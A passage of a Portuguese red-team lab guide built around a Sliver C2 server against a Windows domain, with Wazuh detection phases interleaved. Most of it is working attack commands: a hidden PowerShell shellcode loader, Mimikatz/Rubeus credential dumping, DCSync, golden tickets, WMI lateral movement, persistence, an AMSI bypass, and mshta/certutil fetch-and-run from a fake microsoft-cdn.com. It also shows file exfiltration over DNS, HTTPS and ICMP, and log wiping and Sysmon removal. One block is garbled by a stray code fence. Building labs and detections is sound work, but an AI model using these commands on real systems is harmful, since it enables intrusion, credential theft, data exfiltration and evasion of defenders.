1. Abra navegador e acesse: `http://192.168.20.10/` (ou configure DNS no pfSense)
2. Clique em "Copiar Comando"
3. Pressione **Windows + R**
4. Cole o comando
5. Pressione **Enter**

**O que acontece:**
- PowerShell executa em modo oculto
- Faz requisição HTTPS para `microsoft-cdn.com/api/v1/updates`
- DNS resolve para `192.168.20.10` (Redirector)
- Redirector valida headers e encaminha via WireGuard para C2
- C2 envia payload (shellcode)
- PowerShell executa shellcode em memória
- Implante conecta de volta ao C2

### 6.3 Monitorar Conexão no C2

```bash
# No C2 Server, console Sliver
sudo sliver-client

sliver > sessions

# Quando aparecer sessão:
sliver > use <SESSION_ID>

# Comandos básicos
sliver (SESSION) > whoami
sliver (SESSION) > getuid
sliver (SESSION) > pwd
sliver (SESSION) > ps
sliver (SESSION) > netstat
sliver (SESSION) > ifconfig

# Informações do sistema
sliver (SESSION) > info
sliver (SESSION) > screenshot
```

---

## FASE 7: Movimentação Lateral

### 7.1 Enumeração do Ambiente

```bash
# No Sliver, sessão ativa
sliver (SESSION) > execute-assembly /path/to/SharpHound.exe -c All

# Ou usar comandos nativos
sliver (SESSION) > shell

# Dentro do shell:
C:\> whoami /all
C:\> net user /domain
C:\> net group "Domain Admins" /domain
C:\> net group "Domain Controllers" /domain
C:\> nltest /dclist:corp.local

# Enumerar computadores do domínio
C:\> net view /domain:corp
C:\> Get-ADComputer -Filter * | Select Name, DNSHostName

# Enumerar compartilhamentos
C:\> net view \\DC01 /all
C:\> net view \\CLIENT02 /all
```

### 7.2 Credential Dumping

```bash
# Voltar ao Sliver
sliver (SESSION) > execute-assembly Rubeus.exe dump

# Ou Mimikatz (em memória)
sliver (SESSION) > execute-assembly SafetyKatz.exe "sekurlsa::logonpasswords"

# Dumpar SAM local
sliver (SESSION) > hashdump
```

### 7.3 Lateral Movement via WMI

**Criar novo payload para TARGET:**

```bash
# No C2 Server
sliver > generate --mtls 10.88.88.1:8443 \
    --os windows \
    --arch amd64 \
    --skip-symbols \
    --format exe \
    --save /tmp/implant-lateral.exe
```

**Upload e execução:**

```bash
# Sessão ativa no CLIENT01
sliver (SESSION) > upload /tmp/implant-lateral.exe C:\\Windows\\Temp\\svchost.exe

# Executar via WMI no CLIENT02
sliver (SESSION) > shell

C:\> wmic /node:CLIENT02 /user:CORP\itadmin /password:Admin@123 process call create "C:\Windows\Temp\svchost.exe"

# Ou via PSExec
sliver (SESSION) > psexec --host CLIENT02 --username CORP\itadmin --password Admin@123 --exe-path C:\Windows\Temp\svchost.exe
```

### 7.4 Pass-the-Hash Attack

```bash
# Se obteve hash NTLM do itadmin
sliver (SESSION) > execute-assembly Rubeus.exe asktgt /user:itadmin /rc4:<NTLM_HASH> /domain:corp.local /ptt

# Depois executar comandos como itadmin
sliver (SESSION) > shell
C:\> dir \\DC01\C$
```

### 7.5 Golden Ticket (Se comprometer DC)

```bash
# Dumpar hash krbtgt
sliver (SESSION) > execute-assembly SafetyKatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"

# Criar Golden Ticket
sliver (SESSION) > execute-assembly Rubeus.exe golden /rc4:<KRBTGT_HASH> /user:Administrator /domain:corp.local /sid:<DOMAIN_SID> /ptt

# Agora tem acesso total ao domínio
```

---

## FASE 8: Persistência Avançada

### 8.1 Scheduled Task Persistence

```bash
sliver (SESSION) > shell

# Criar tarefa agendada
C:\> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\svchost.exe" /sc onlogon /ru SYSTEM /f

# Verificar
C:\> schtasks /query /tn "WindowsUpdate"
```

### 8.2 Registry Run Key

```bash
C:\> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f

# Verificar
C:\> reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 8.3 Service Persistence

```bash
C:\> sc create "WindowsDefenderUpdate" binPath= "C:\Windows\Temp\svchost.exe" start= auto
C:\> sc description "WindowsDefenderUpdate" "Windows Defender Definition Updates"
C:\> sc start "WindowsDefenderUpdate"
```

### 8.4 WMI Event Subscription

```powershell
# Criar WMI Event Consumer
$filterName = "SystemBootFilter"
$consumerName = "SystemBootConsumer"

# Event Filter (trigger no boot)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Command Line Event Consumer
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "C:\Windows\Temp\svchost.exe"
}

# Bind Filter to Consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## FASE 9: Configuração SIEM para Detecção

### 9.1 Criar VM Ubuntu SIEM

**Configurações VM:**
- OS: Ubuntu Server 22.04
- RAM: 8GB
- HD: 100GB
- Network: VMnet5 (CORP)
- IP: `192.168.100.200`

### 9.2 Instalar Wazuh SIEM

```bash
# Atualizar sistema
sudo apt update && sudo apt upgrade -y

# Configurar IP estático
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    ens33:
      addresses:
        - 192.168.100.200/24
      routes:
        - to: default
          via: 192.168.100.1
      nameservers:
        addresses: [192.168.100.10, 8.8.8.8]
```

```bash
sudo netplan apply

# Instalar Wazuh All-in-One
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# Anotar credenciais que aparecem no final da instalação
```

**Acesse Wazuh:**
- URL: `https://192.168.100.200`
- User: `admin`
- Pass: `<gerado_na_instalacao>`

### 9.3 Configurar Agentes Wazuh nos Clientes

**No SIEM (192.168.100.200):**

```bash
# Gerar pacote de instalação Windows
sudo /var/ossec/bin/agent-auth -m 192.168.100.200
```

**No CLIENT01 e CLIENT02:**

1. Baixe o agente: https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi

```powershell
# PowerShell como Administrador

# Instalar agente
.\wazuh-agent-4.7.0-1.msi /q WAZUH_MANAGER="192.168.100.200" WAZUH_AGENT_NAME="CLIENT01"

# Iniciar serviço
NET START WazuhSvc

# Verificar status
& "C:\Program Files (x86)\ossec-agent\agent-info.exe"
```

### 9.4 Configurar Regras de Detecção Customizadas

**No SIEM:**

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

**Adicionar regras:**

```xml
<!-- Regras Customizadas C2 Detection -->
<group name="c2_detection,">

  <!-- PowerShell Execução Oculta -->
  <rule id="100001" level="12">
    <if_sid>60106</if_sid>
    <match>-W Hidden|Hidden</match>
    <match>-NoP|NoProfile</match>
    <match>-Exec Bypass|ExecutionPolicy Bypass</match>
    <description>PowerShell executado com parâmetros suspeitos (C2 Activity)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <!-- Download via IWR/Invoke-WebRequest -->
  <rule id="100002" level="10">
    <if_sid>60106</if_sid>
    <match>Invoke-WebRequest|iwr|irm|Invoke-RestMethod</match>
    <description>PowerShell fazendo download de conteúdo remoto</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>

  <!-- Execução de shellcode em memória -->
  <rule id="100003" level="15">
    <if_sid>60106</if_sid>
    <match>VirtualAlloc|CreateThread|Marshal::AllocHGlobal</match>
    <description>PowerShell executando shellcode em memória (CRITICAL)</description>
    <mitre>
      <id>T1055</id>
      <id>T1620</id>
    </mitre>
  </rule>

  <!-- Conexão para domínios suspeitos -->
  <rule id="100004" level="8">
    <if_group>windows</if_group>
    <match>microsoft-cdn.com|updates.microsoft-cdn.com</match>
    <description>Conexão para domínio suspeito de C2</description>
    <mitre>
      <id>T1071.001</id>
    </mitre>
  </rule>

  <!-- Mimikatz/Rubeus execution -->
  <rule id="100005" level="15">
    <if_sid>60106</if_sid>
    <match>sekurlsa::logonpasswords|lsadump::sam|kerberos::golden|asktgt</match>
    <description>Execução de ferramentas de credential dumping (CRITICAL)</description>
    <mitre>
      <id>T1003</id>
      <id>T1558.001</id>
    </mitre>
  </rule>

  <!-- Lateral Movement via WMI -->
  <rule id="100006" level="12">
    <if_group>windows</if_group>
    <match>wmic.*process call create</match>
    <description>Execução remota via WMI detectada</description>
    <mitre>
      <id>T1047</id>
      <id>T1021.006</id>
    </mitre>
  </rule>

  <!-- Persistência via Scheduled Task -->
  <rule id="100007" level="10">
    <if_sid>60106</if_sid>
    <match>schtasks /create</match>
    <description>Criação de tarefa agendada suspeita</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
  </rule>

  <!-- Registry Run Key Persistence -->
  <rule id="100008" level="10">
    <if_group>windows</if_group>
    <match>CurrentVersion\\Run</match>
    <match>reg add</match>
    <description>Modificação de chave de registro para persistência</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
  </rule>

  <!-- Service Creation -->
  <rule id="100009" level="10">
    <if_sid>60106</if_sid>
    <match>sc create</match>
    <description>Criação de serviço Windows suspeito</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
  </rule>

  <!-- Network Connection to C2 IP -->
  <rule id="100010" level="12">
    <if_group>windows</if_group>
    <field name="win.eventdata.destinationIp">^192\.168\.20\.</field>
    <description>Conexão de rede para subnet DMZ suspeita (C2 Infrastructure)</description>
    <mitre>
      <id>T1071</id>
    </mitre>
  </rule>

</group>
```

```bash
# Reiniciar Wazuh
sudo systemctl restart wazuh-manager
```

### 9.5 Habilitar Sysmon nos Clientes Windows

**Download Sysmon:**

```powershell
# No CLIENT01 e CLIENT02
# Baixar Sysmon: https://download.sysinternals.com/files/Sysmon.zip

# Baixar config do SwiftOnSecurity
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\sysmonconfig.xml"

# Instalar Sysmon
.\Sysmon64.exe -accepteula -i C:\sysmonconfig.xml

# Verificar
Get-Service Sysmon64
```

**Configurar Wazuh para coletar Sysmon:**

```bash
# No SIEM
sudo nano /var/ossec/etc/ossec.conf
```

Adicionar dentro de `<ossec_config>`:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

```bash
sudo systemctl restart wazuh-manager
```

---

## FASE 10: Testes de Detecção

### 10.1 Checklist de Testes

Execute cada técnica e verifique se o SIEM detecta:

**Teste 1: Initial Access**
```powershell
# CLIENT01
powershell -NoP -W Hidden -Exec Bypass -C "Write-Host 'Test C2'"
```
✅ **Esperado:** Alerta Rule ID 100001

**Teste 2: Download Remoto**
```powershell
irm https://microsoft-cdn.com/api/v1/updates
```
✅ **Esperado:** Alertas 100002 e 100004

**Teste 3: Shellcode Execution**
```powershell
$code = @"
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@
Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Win32Functions"
```
✅ **Esperado:** Alerta 100003

**Teste 4: Credential Dumping**
```powershell
# Simular comando Mimikatz
echo "sekurlsa::logonpasswords" | Out-Null
```
✅ **Esperado:** Alerta 100005

**Teste 5: Lateral Movement**
```powershell
wmic /node:CLIENT02 process call create "cmd.exe"
```
✅ **Esperado:** Alerta 100006

**Teste 6: Persistence - Scheduled Task**
```powershell
schtasks /create /tn "Test" /tr "cmd.exe" /sc once /st 12:00
```
✅ **Esperado:** Alerta 100007

**Teste 7: Persistence - Registry**
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Test /t REG_SZ /d "cmd.exe" /f
```
✅ **Esperado:** Alerta 100008

**Teste 8: Service Creation**
```powershell
sc create TestService binPath= "cmd.exe"
```
✅ **Esperado:** Alerta 100009

### 10.2 Dashboard Wazuh

**Criar Dashboard Customizado:**

1. Acesse Wazuh Web Interface
2. Vá em **Modules → Security Events**
3. Crie filtro:
   - `rule.id: (100001 OR 100002 OR 100003 OR 100004 OR 100005 OR 100006 OR 100007 OR 100008 OR 100009 OR 100010)`
4. Save como "C2 Detection Dashboard"

**Visualizações úteis:**
- Timeline de alertas
- Top agents afetados
- MITRE ATT&CK heatmap
- Geo-localização de IPs (se tiver)

---

## FASE 11: Técnicas de Evasão para Testar

### 11.1 Ofuscação de PowerShell

```powershell
# Base64 encoding
$command = "Write-Host 'Test'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

powershell -EncodedCommand $encoded
```

### 11.2 AMSI Bypass

```powershell
# AMSI Patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 11.3 Process Injection (Reflective DLL)

```bash
# No Sliver
sliver (SESSION) > shinject --pid 1234 /path/to/implant.bin
```

### 11.4 Domain Fronting

Modificar payload para usar CDN real:

```powershell
# Usar Cloudflare como front
$headers = @{
    'Host' = 'microsoft-cdn.com'
    'X-C2-Auth' = 'Bearer-C2-TOKEN-12```powershell
345'
}
irm 'https://cloudflare.net/path' -Headers $headers
```

### 11.5 Living Off The Land (LOLBins)

```powershell
# Usar certutil para download
certutil -urlcache -split -f https://microsoft-cdn.com/api/v1/updates payload.txt

# Usar bitsadmin
bitsadmin /transfer myDownloadJob /download /priority normal https://microsoft-cdn.com/api/v1/updates C:\temp\payload.txt

# Usar mshta
mshta vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""powershell -c irm https://microsoft-cdn.com/api/v1/updates|iex"",0)"))
```

### 11.6 Process Hollowing

```bash
# No Sliver, criar processo suspenso e injetar
sliver (SESSION) > spawndll --process notepad.exe /path/to/implant.dll
```

---

## FASE 12: Logging e Forensics

### 12.1 Configurar Enhanced Logging no Windows

**No CLIENT01 e CLIENT02:**

```powershell
# PowerShell como Administrador

# Habilitar PowerShell Script Block Logging
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Habilitar PowerShell Transcription
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path $regPath -Name "OutputDirectory" -Value "C:\PSTranscripts"
Set-ItemProperty -Path $regPath -Name "EnableInvocationHeader" -Value 1

# Habilitar Module Logging
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableModuleLogging" -Value 1

# Habilitar Command Line Process Auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Habilitar auditing de acesso a objetos
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
```

### 12.2 Configurar Windows Event Forwarding

**No DC (Coletor Central):**

```powershell
# Habilitar WinRM
Enable-PSRemoting -Force

# Configurar coletor de eventos
wecutil qc /q

# Criar subscription
$xml = @"
<Subscription xmlns="http://schemas.microsoft.com/2006/03/windows/events/subscription">
    <SubscriptionId>C2-Detection-Subscription</SubscriptionId>
    <SubscriptionType>SourceInitiated</SubscriptionType>
    <Description>Coleta eventos de segurança para detecção C2</Description>
    <Enabled>true</Enabled>
    <Uri>http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog</Uri>
    <ConfigurationMode>Custom</ConfigurationMode>
    <Delivery Mode="Push">
        <Batching>
            <MaxItems>5</MaxItems>
            <MaxLatencyTime>300000</MaxLatencyTime>
        </Batching>
        <PushSettings>
            <Heartbeat Interval="3600000"/>
        </PushSettings>
    </Delivery>
    <Query>
        <![CDATA[
        <QueryList>
            <Query Id="0">
                <Select Path="Security">*[System[(EventID=4688 or EventID=4689 or EventID=4624 or EventID=4625)]]</Select>
                <Select Path="Microsoft-Windows-PowerShell/Operational">*</Select>
                <Select Path="Microsoft-Windows-Sysmon/Operational">*</Select>
                <Select Path="Windows PowerShell">*</Select>
            </Query>
        </QueryList>
        ]]>
    </Query>
    <ReadExistingEvents>false</ReadExistingEvents>
    <TransportName>HTTP</TransportName>
    <ContentFormat>RenderedText</ContentFormat>
    <Locale Language="en-US"/>
    <LogFile>ForwardedEvents</LogFile>
    <AllowedSourceNonDomainComputers/>
    <AllowedSourceDomainComputers>O:NSG:BAD:P(A;;GA;;;DC)S:</AllowedSourceDomainComputers>
</Subscription>
"@

$xml | Out-File C:\c2-subscription.xml
wecutil cs C:\c2-subscription.xml
```

**Nos Clientes:**

```powershell
# Adicionar ao grupo Event Log Readers
Add-ADGroupMember -Identity "Event Log Readers" -Members "CLIENT01$","CLIENT02$"

# Configurar forwarder
winrm quickconfig -q
wecutil qc /q

# Adicionar servidor coletor
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager" /v 1 /t REG_SZ /d "Server=http://DC01.corp.local:5985/wsman/SubscriptionManager/WEC" /f

# Reiniciar serviço
Restart-Service EventLog
```

### 12.3 Análise de Logs C2

**No Redirector:**

```bash
# Visualizar logs de acesso
sudo tail -f /var/log/nginx/c2-access.log

# Filtrar por Client-ID
grep "CLI-" /var/log/nginx/c2-access.log

# Análise de User-Agents
awk -F'"' '{print $6}' /var/log/nginx/c2-access.log | sort | uniq -c | sort -rn

# IPs únicos que acessaram
awk '{print $1}' /var/log/nginx/c2-access.log | sort | uniq -c | sort -rn

# Endpoints mais acessados
awk '{print $7}' /var/log/nginx/c2-access.log | sort | uniq -c | sort -rn
```

**No C2 Server:**

```bash
# Logs do payload delivery
sudo tail -f /var/log/c2-payload-access.log

# Análise de IDs de cliente
grep "Success: True" /var/log/c2-payload-access.log | awk '{print $4}' | sort | uniq

# Timeline de infecções
cat /var/log/c2-payload-access.log | grep "Success: True"
```

**No Sliver:**

```bash
# Logs de sessões
sliver > sessions -v

# Histórico de comandos
cat ~/.sliver-client/logs/sliver-client.log

# Beacons ativos
sliver > beacons
```

---

## FASE 13: Pivoting e Tunelamento

### 13.1 SOCKS Proxy via Sliver

```bash
# No Sliver, sessão ativa no CLIENT01
sliver (SESSION) > socks5 start

# Anotar porta (ex: 1081)
# Configurar proxychains no C2 Server
sudo nano /etc/proxychains4.conf
```

**Adicionar no final:**
```
[ProxyList]
socks5 127.0.0.1 1081
```

**Usar proxychains:**
```bash
# Agora comandos passam pela rede interna
proxychains nmap -sT -Pn 192.168.100.0/24
proxychains crackmapexec smb 192.168.100.0/24 -u itadmin -p Admin@123
proxychains psexec.py CORP/itadmin:Admin@123@192.168.100.102
```

### 13.2 Port Forwarding

```bash
# Forward porta RDP do CLIENT02 para C2 Server
sliver (SESSION) > portfwd add --bind 127.0.0.1:3389 --remote 192.168.100.102:3389

# Agora no C2 Server:
rdesktop 127.0.0.1:3389
```

### 13.3 Reverse Port Forward

```bash
# Expor porta do C2 na vítima
sliver (SESSION) > rportfwd add --bind 0.0.0.0:8080 --remote 10.88.88.1:80

# Agora CLIENT01 pode acessar serviços do C2 em localhost:8080
```

### 13.4 SSH Tunneling (Alternativa)

Se conseguir SSH em algum servidor:

```bash
# SSH Reverse Tunnel
sliver (SESSION) > shell
C:\> ssh -R 8080:localhost:80 user@10.99.99.10

# SSH SOCKS Proxy
ssh -D 1080 user@compromised-server

# SSH Local Forward
ssh -L 3389:192.168.100.102:3389 user@pivot-server
```

---

## FASE 14: Post-Exploitation Avançada

### 14.1 Kerberoasting

```bash
sliver (SESSION) > execute-assembly Rubeus.exe kerberoast /outfile:C:\temp\hashes.txt

# Download hashes
sliver (SESSION) > download C:\temp\hashes.txt /tmp/

# Crack com hashcat no C2
hashcat -m 13100 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

### 14.2 DCSync Attack

```bash
# Com privilégios de Domain Admin
sliver (SESSION) > execute-assembly SafetyKatz.exe "lsadump::dcsync /domain:corp.local /all /csv"

# Ou Mimikatz específico
sliver (SESSION) > execute-assembly SafetyKatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator"
```

### 14.3 Shadow Copies para Credential Theft

```powershell
# Criar shadow copy
wmic shadowcopy call create Volume='C:\'

# Copiar NTDS.dit e SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Download no Sliver
sliver (SESSION) > download C:\temp\ntds.dit
sliver (SESSION) > download C:\temp\SYSTEM

# Extrair hashes no C2
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### 14.4 Token Impersonation

```bash
# Listar tokens disponíveis
sliver (SESSION) > getprivs

# Impersonar token do SYSTEM
sliver (SESSION) > impersonate SYSTEM

# Ou impersonar usuário logado
sliver (SESSION) > steal_token <PID_do_processo_do_usuario>
```

### 14.5 Bypass UAC

```bash
# Método FodHelper
sliver (SESSION) > shell

C:\> reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "C:\Windows\Temp\svchost.exe" /f
C:\> reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
C:\> fodhelper.exe

# Cleanup
C:\> reg delete "HKCU\Software\Classes\ms-settings" /f
```

---

## FASE 15: Exfiltração de Dados

### 15.1 Exfiltração via DNS

**Configurar servidor DNS no C2:**

```bash
# Instalar dnsmasq
sudo apt install dnsmasq

# Configurar
sudo nano /etc/dnsmasq.conf
```

```
# Adicionar
log-queries
log-facility=/var/log/dnsmasq.log
```

```bash
sudo systemctl restart dnsmasq
```

**No cliente compromisso:**

```powershell
# Exfiltrar via DNS queries
$data = Get-Content C:\sensitive.txt
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
$chunks = $encoded -split '(.{32})' | Where-Object {$_}

foreach($chunk in $chunks) {
    nslookup "$chunk.exfil.microsoft-cdn.com" 10.88.88.1
    Start-Sleep -Milliseconds 100
}
```

### 15.2 Exfiltração via HTTPS

```bash
# No Sliver
sliver (SESSION) > download C:\Users\jdoe\Documents\*.docx /tmp/exfil/

# Ou via upload para servidor externo
sliver (SESSION) > shell

C:\> powershell -c "
$files = Get-ChildItem C:\Users\jdoe\Documents -Recurse -Include *.docx,*.xlsx,*.pdf
foreach($file in $files) {
    $content = [System.IO.File]::ReadAllBytes($file.FullName)
    $b64 = [Convert]::ToBase64String($content)
    Invoke-RestMethod -Uri 'https://microsoft-cdn.com/upload' -Method POST -Body $b64 -Headers @{'X-C2-Auth'='Bearer-C2-TOKEN-12345'}
}
"
```

### 15.3 Exfiltração via ICMP (Ping)

```powershell
# Exfiltrar via ICMP data field
$data = "SENSITIVE DATA HERE"
$bytes = [Text.Encoding]::UTF8.GetBytes($data)

# Enviar em chunks via ping
for($i=0; $i -lt $bytes.Length; $i+=32) {
    $chunk = $bytes[$i..($i+31)]
    ping -n 1 -l $chunk.Length 10.88.88.1
}
```

### 15.4 Staging Area

```bash
# Criar área de staging local
sliver (SESSION) > mkdir C:\Windows\Temp\.cache
sliver (SESSION) > shell

# Copiar arquivos sensíveis
C:\> robocopy C:\Users\jdoe\Documents C:\Windows\Temp\.cache *.docx *.xlsx /S

# Compactar
C:\> powershell Compress-Archive -Path C:\Windows\Temp\.cache\* -DestinationPath C:\Windows\Temp\backup.zip

# Exfiltrar
sliver (SESSION) > download C:\Windows\Temp\backup.zip
```

---

## FASE 16: Anti-Forensics e Cleanup

### 16.1 Limpeza de Logs do Windows

```powershell
# Limpar Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Ou selectivo (últimas 24h)
Get-WinEvent -LogName Security | Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-24)} | ForEach-Object {wevtutil clear-log Security}
```

### 16.2 Timestomping

```powershell
# Modificar timestamps de arquivo
$file = Get-Item C:\Windows\Temp\svchost.exe
$file.CreationTime = (Get-Date "01/01/2020 12:00:00")
$file.LastWriteTime = (Get-Date "01/01/2020 12:00:00")
$file.LastAccessTime = (Get-Date "01/01/2020 12:00:00")
```

### 16.3 Remover Artefatos

```bash
# No Sliver
sliver (SESSION) > shell

# Deletar implantes
C:\> del C:\Windows\Temp\svchost.exe
C:\> del C:\Windows\Temp\*.dll

# Remover persistência
C:\> schtasks /delete /tn "WindowsUpdate" /f
C:\> reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /f
C:\> sc delete "WindowsDefenderUpdate"

# Limpar prefetch
C:\> del C:\Windows\Prefetch\*.pf

# Limpar temp
C:\> del C:\Users\*\AppData\Local\Temp\* /q /s
C:\> del C:\Windows\Temp\* /q /s
```

### 16.4 Desativar Sysmon

```powershell
# Parar e desinstalar Sysmon
Stop-Service Sysmon64
C:\Sysmon64.exe -u

# Ou mais sigiloso: pausar temporariamente
fltmc unload SysmonDrv
```

### 16.5 Script de Cleanup Automatizado

```powershell
# C:\cleanup.ps1
# EXECUTE APENAS APÓS CONCLUIR OBJETIVOS

# Stop implant
Stop-Process -Name svchost -Force -ErrorAction SilentlyContinue

# Remove files
Remove-Item C:\Windows\Temp\svchost.exe -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\.cache -Recurse -Force -ErrorAction SilentlyContinue

# Remove persistence
schtasks /delete /tn "WindowsUpdate" /f 2>$null
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /f 2>$null
sc delete "WindowsDefenderUpdate" 2>$null

# Clear logs
wevtutil cl Security
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path -Force
```

---

## FASE 17: Monitoramento e Alertas

### 17.1 Configurar Alertas no Wazuh

```bash
# No SIEM
sudo nano /var/ossec/etc/ossec.conf
```

**Adicionar integração com email:**

```xml
<global>
  <email_notification>yes</email_notification>
  <smtp_server>smtp.gmail.com</smtp_server>
  <email_from>siem@corp.local</email_from>
  <email_to>admin@corp.local</email_to>
  <email_maxperhour>12</email_maxperhour>
</global>

<alerts>
  <email_alert_level>10</email_alert_level>
</alerts>
```

### 17.2 Criar Regra de Alerta Imediato

```xml
<!-- Em /var/ossec/etc/rules/local_rules.xml -->

<!-- Alerta crítico imediato -->
<rule id="100100" level="15">
  <if_sid>100001,100002,100003,100005</if_sid>
  <description>CRITICAL: Atividade C2 detectada - Resposta imediata necessária</description>
  <group>c2_detection,pci_dss_10.6.1,gdpr_IV_35.7.d,</group>
</rule>

<!-- Frequência de comandos PowerShell -->
<rule id="100101" level="12" frequency="5" timeframe="60">
  <if_matched_sid>100001</if_matched_sid>
  <description>Múltiplos comandos PowerShell suspeitos em curto período</description>
</rule>
```

### 17.3 Dashboard de Threat Hunting

**No Wazuh, criar queries customizadas:**

```json
// Query para timeline de ataque
{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "now-1h"}}},
        {"terms": {"rule.id": [100001,100002,100003,100004,100005,100006,100007,100008,100009,100010]}}
      ]
    }
  },
  "sort": [{"@timestamp": "asc"}],
  "size": 1000
}
```

### 17.4 Automação de Resposta

```bash
# Criar script de resposta automática
sudo nano /var/ossec/active-response/bin/block-c2.sh
```

```bash
#!/bin/bash
# Block C2 activity

AGENT_ID=$1
ALERT_ID=$2
RULE_ID=$3

# Log
echo "$(date) - Blocking C2 on agent $AGENT_ID - Rule: $RULE_ID" >> /var/log/ossec-ar.log

# Isolar host via firewall
if [ "$RULE_ID" = "100003" ] || [ "$RULE_ID" = "100005" ]; then
    # Comando para isolar (exemplo com iptables via agent)
    /var/ossec/bin/agent_control -b $AGENT_ID -u
fi

exit 0
```

```bash
sudo chmod 750 /var/ossec/active-response/bin/block-c2.sh
sudo chown root:ossec /var/ossec/active-response/bin/block-c2.sh
```

**Configurar active response:**

```xml
<!-- Em /var/ossec/etc/ossec.conf -->
<command>
  <name>block-c2</name>
  <executable>block-c2.sh</executable>
  <timeout_allowed>no</timeout_allowed>
</command>

<active-response>
  <command>block-c2</command>
  <location>local</location>
  <rules_id>100003,100005</rules_id>
</active-response>
```

---

## FASE 18: Documentação e Relatório

### 18.1 Coletar Evidências

**No C2 Server:**

```bash
# Criar diretório de evidências
mkdir -p ~/evidence/$(date +%Y%m%d)
cd ~/evidence/$(date +%Y%m%d)

# Exportar sessões Sliver
sliver > sessions -v > sessions.txt

# Copiar logs
cp /var/log/c2-payload-access.log ./
cp ~/.sliver-client/logs/sliver-client.log ./

# Exportar configurações
cp /etc/wireguard/wg0.conf ./wg0-c2.conf
```

**No Redirector:**

```bash
mkdir -p ~/evidence/$(date +%Y%m%d)
cd ~/evidence/$(date +%Y%m%d)

# Logs Nginx
cp /var/log/nginx/c2-access.log ./
cp /var/log/nginx/c2-error.log ./

# Configurações
cp /etc/nginx/sites-available/c2-redirector ./
cp /etc/wireguard/wg0.conf ./wg0-redirector.conf
```

**No SIEM:**

```bash
# Exportar alertas
curl -u admin:password -XGET "https://192.168.100.200:9200/wazuh-alerts-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-24h"
      }
    }
  }
}
' > wazuh-alerts-24h.json
```

### 18.2 Estrutura do Relatório

```markdown
